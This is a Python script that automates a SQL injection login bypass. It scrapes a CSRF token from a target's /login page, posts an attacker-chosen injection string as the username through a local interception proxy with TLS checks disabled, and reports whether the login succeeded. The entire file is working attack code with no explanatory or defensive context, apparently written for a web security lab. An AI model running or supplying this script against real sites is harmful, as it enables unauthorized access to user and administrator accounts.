import requests
import urllib3
import sys
from bs4 import BeautifulSoup
proxies = {'http':'http://127.0.0.1:8082','https':'http://127.0.0.1:8082'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def getCsrf(s, loginlink):
    sr = s.get(loginlink, verify=False, proxies=proxies)
    soup = BeautifulSoup(sr.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def loginbypassthrusqli(s, loginlink, userpayload, password):
  csrf = getCsrf(s, loginlink)
  data = {
          'csrf':csrf,
          'username': userpayload,
          'password':password
        }
  r = s.post(loginlink, data=data, verify=False, proxies=proxies)

  if ("Log out" in r.text):
     print("[+] Login Bypassed thru sqli injection")

  else:
     print("[+] Login Bypass Failed thru sqli injection")









if __name__ == "__main__":
    try:
       url = sys.argv[1].strip()
       uri = "/login"
       loginlink = url + uri
       userpayload = sys.argv[2].strip()
       password = sys.argv[3].strip()

    except IndexError:
       print("[+] Usage %s <url> <userpayload> <password>" %sys.argv[0])
       print("[+] Example %s https://example.com '1=1-- admin" %sys.argv[0])
       sys.exit(1)

    s = requests.Session()
    loginbypassthrusqli(s, loginlink, userpayload, password)



